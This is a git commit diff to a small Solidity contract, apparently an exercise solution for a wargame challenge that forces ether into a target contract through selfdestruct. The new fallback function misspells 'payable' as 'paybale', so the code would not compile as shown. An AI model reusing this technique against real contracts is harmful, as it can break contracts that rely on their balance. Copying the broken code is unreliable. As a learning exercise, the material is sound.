493ad2de709dd29164abb5332c7c81251ee9aff1
cdyfng <xiaofeng_chen2007@163.com>
2020-04-15 00:04:41 +0800

    enable payable in Force

--- ForceCrack.sol
+++ ForceCrack.sol
@@ -1,9 +1,7 @@
 pragma solidity ^0.4.20;
 contract Force {
- function Force() public payable {}
- function collect() public payable returns(uint) {
-    return address(this).balance;
-}
+function() paybale{}
+
  function exploit(address _target) public {
     selfdestruct(_target);
  }
